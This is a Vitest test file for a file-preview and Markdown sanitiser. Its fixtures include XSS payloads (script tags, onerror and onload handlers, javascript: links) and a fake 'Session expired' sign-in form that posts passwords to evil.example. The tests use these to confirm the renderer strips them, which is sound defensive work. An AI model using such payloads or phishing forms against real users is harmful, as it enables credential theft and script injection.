import { describe, expect, it } from "vitest";
import { previewKind } from "./preview.ts";
import { renderMarkdown } from "./markdown.ts";

const f = (name: string, type: "file" | "dir" | "symlink" = "file", targetType?: "file" | "dir") => ({
  name,
  type,
  ...(targetType ? { targetType } : {}),
});

describe("previewKind", () => {
  it("frames pictures and PDFs, renders Markdown, reads the rest as text", () => {
    expect(previewKind(f("a.png"))).toBe("image");
    expect(previewKind(f("A.JPG"))).toBe("image");
    expect(previewKind(f("paper.pdf"))).toBe("pdf");
    expect(previewKind(f("README.md"))).toBe("markdown");
    expect(previewKind(f("main.ts"))).toBe("text");
    expect(previewKind(f("Makefile"))).toBe("text");
  });

  it("shows HTML and SVG as their source, never as a page", () => {
    expect(previewKind(f("index.html"))).toBe("text");
    expect(previewKind(f("logo.svg"))).toBe("text");
  });

  it("does not try binaries or folders", () => {
    expect(previewKind(f("a.zip"))).toBe("none");
    expect(previewKind(f("src", "dir"))).toBe("none");
    expect(previewKind(f("link", "symlink", "dir"))).toBe("none");
    expect(previewKind(f("link.md", "symlink", "file"))).toBe("markdown");
  });
});

describe("renderMarkdown", () => {
  it("renders, and removes anything that could run", () => {
    const { html } = renderMarkdown(
      '# Title\n\n<script>alert(1)</script>\n\n<img src=x onerror="alert(2)">\n\n<svg onload="alert(3)"><circle/></svg>\n\n[x](javascript:alert(4))\n\n<iframe src="/"></iframe>',
      "/workspace/demo/README.md",
    );
    expect(html).toContain("<h1");
    expect(html).not.toMatch(/<script|onerror|onload|<svg|javascript:|<iframe/i);
  });

  it("opens links in a new tab without a referrer", () => {
    const { html } = renderMarkdown("[site](https://example.com)", "/w/README.md");
    expect(html).toContain('target="_blank"');
    expect(html).toContain('rel="noopener noreferrer"');
  });

  it("shows a relative picture from the files API", () => {
    const { html } = renderMarkdown("![logo](./img/logo.png)", "/workspace/demo/README.md");
    expect(html).toContain("/api/files/raw?path=%2Fworkspace%2Fdemo%2Fimg%2Flogo.png&amp;inline=1");
  });

  it("cannot dress up as the app: no classes, styles, ids, roles, aria or tab stops", () => {
    // A README that draws what looks like the app's own sign-in dialog over it.
    const readme = [
      '<div class="scrim" style="position:fixed;inset:0;z-index:9999">',
      '  <div class="dialog pop-in" role="dialog" aria-modal="true" aria-label="Session expired" id="main" tabindex="0" data-x="1">',
      '    <h2 class="dialog-title" id="root">Session expired</h2>',
      '    <p name="body">Sign in again to keep working.</p>',
      '    <form action="https://evil.example/steal"><input name="password" type="password"><button>Sign in</button></form>',
      '  </div>',
      '</div>',
    ].join("\n");
    const { html } = renderMarkdown(readme, "/workspace/README.md");
    expect(html).toContain("Session expired");
    expect(html).not.toMatch(/\s(class|style|id|name|role|tabindex|data-x)=/);
    expect(html).not.toMatch(/aria-/);
    expect(html).not.toMatch(/<(form|input|button)/);
  });

  it("does not fetch pictures from elsewhere until asked", () => {
    const md = "![tracker](https://tracker.example/pixel.png) ![also](//cdn.example/x.png) ![ok](data:image/png;base64,iVBORw0KGgo=)";
    const blocked = renderMarkdown(md, "/w/README.md");
    expect(blocked.blocked).toBe(2);
    expect(blocked.html).not.toMatch(/<img[^>]+src="(https?:)?\/\//);
    expect(blocked.html).toContain("data:image/png");
    const loaded = renderMarkdown(md, "/w/README.md", { remoteImages: true });
    expect(loaded.blocked).toBe(0);
    expect(loaded.html).toContain('src="https://tracker.example/pixel.png"');
    expect(loaded.html).toContain('referrerpolicy="no-referrer"');
  });
});
